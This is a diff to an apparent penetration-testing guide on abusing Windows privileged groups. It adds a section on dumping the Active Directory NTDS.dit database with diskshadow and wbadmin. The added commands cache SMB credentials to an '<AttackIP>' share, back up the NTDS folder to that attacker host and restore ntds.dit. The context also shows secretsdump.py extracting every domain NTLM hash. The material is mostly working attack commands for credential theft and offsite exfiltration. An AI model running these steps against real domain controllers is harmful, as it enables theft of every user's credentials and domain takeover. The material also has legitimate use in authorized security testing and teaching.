@@ -154,6 +154,8 @@ For instance, you can directly access the Domain Controller file system:
 
 You can abuse this access to **steal** the active directory database **`NTDS.dit`** to get all the **NTLM hashes** for all user and computer objects in the domain.
 
+#### Using diskshadow.exe to dumo NTDS.dit
+
 Using [**diskshadow**](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow) you can **create a shadow copy** of the **`C` drive** and in the `F` drive for example. The, you can steal the `NTDS.dit` file from this shadow copy as it won't be in use by the system:
 
 ```
@@ -199,6 +201,38 @@ Finally you can **get all the hashes** from the **`NTDS.dit`**:
 ```shell-session
 secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
 ```
+
+#### Using wbadmin.exe to dumo NTDS.dit
+
+Using wbadmin.exe is very similar to diskshadow.exe, the wbadmin.exe utility is a command line utility built into Windows, since Windows Vista/Server 2008. 
+
+Before using it, you need to [**setup ntfs filesystem for smb server**](https://gist.github.com/manesec/9e0e8000446b966d0f0ef74000829801) on the attacker machine.
+
+When you finished to setup smb server, you need to cache the smb credential on target machine:
+```
+# cache the smb credential.
+net use X: \\<AttackIP>\sharename /user:smbuser password
+
+# check if working.
+dir X:\
+```
+
+If no error, use wbadmin.exe to exploit it: 
+
+```
+# Start backup the system.
+# In here, no need to use `X:\`, just using `\\<AttackIP>\sharename` should be ok.
+echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
+
+# Look at the backup version to get time.
+wbadmin get versions
+
+# Restore the version to dump ntds.dit.
+echo "Y" | wbadmin start recovery -version:10/09/2023-23:48 -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
+```
+If it successful, it will dump into `C:\ntds.dit`.
+
+[DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s)
 
 ## DnsAdmins
 
